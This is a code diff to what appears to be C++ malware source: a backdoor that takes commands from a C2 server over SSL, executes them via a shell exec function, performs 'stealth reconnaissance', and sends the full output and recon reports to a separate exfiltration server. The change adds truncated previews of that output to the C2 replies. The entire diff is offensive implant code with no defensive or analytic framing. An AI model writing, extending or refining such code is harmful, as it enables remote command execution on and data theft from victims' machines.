@@ -33,18 +33,13 @@
 #define EXFIL_PORT 8889
 #endif
 
+// Maximum number of characters to echo back to C2 terminal
+static const size_t C2_PREVIEW_LEN = 500;
+
 std::string decrypt(char* buf, size_t bytes) {
     buf[bytes] = '\0';
     std::string message(buf);
     return message;
-}
-
-std::vector<std::byte> encrypt(std::string s) {
-    std::vector<std::byte> e;
-    for(auto& c : s) {
-        e.push_back(static_cast<std::byte>(c));
-    }
-    return e;
 }
 
 std::string exec(const char* cmd) {
@@ -59,8 +54,8 @@ std::string exec(const char* cmd) {
 }
 
 /**
- * handleMessage - processes one command from C2, sends output to exfil server
- * and a short acknowledgment to the C2 server.
+ * handleMessage - processes one command from C2, sends full output to exfil server
+ * and a short preview to the C2 server.
  */
 void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
     std::istringstream iss(msg);
@@ -79,12 +74,22 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
         throw 1;
     } else if (keyword == "CMD") {
         std::string output = exec(data.c_str());
-        c2_response = (output.empty() ? "CMD OK" : output);
+        // Send full output to C2 (truncated for terminal friendliness)
+        if (output.length() > C2_PREVIEW_LEN) {
+            c2_response = output.substr(0, C2_PREVIEW_LEN) + "\n... [full output in exfil]";
+        } else {
+            c2_response = output.empty() ? "CMD OK" : output;
+        }
         exfil_data = "CMD: " + data + "\n" + output + "\n---\n";
     } else if (keyword == "RECON") {
         // Full stealth reconnaissance
         std::string recon_report = perform_full_recon();
-        c2_response = "OK " + id;   // short ack to C2
+        // Send a preview to C2
+        if (recon_report.length() > C2_PREVIEW_LEN) {
+            c2_response = recon_report.substr(0, C2_PREVIEW_LEN) + "\n... [full report in exfil]";
+        } else {
+            c2_response = recon_report;
+        }
         exfil_data = "=== FULL RECON REPORT ===\n" + recon_report + "\n=== END ===\n";
     } else {
         c2_response = "ERR " + id;
@@ -95,7 +100,7 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
         SSL_write(exfil_ssl, exfil_data.c_str(), exfil_data.size());
     }
 
-    // Send acknowledgment / short response to the C2 server
+    // Send preview / short response to the C2 server
     SSL_write(c2_ssl, c2_response.c_str(), c2_response.size());
 }
 
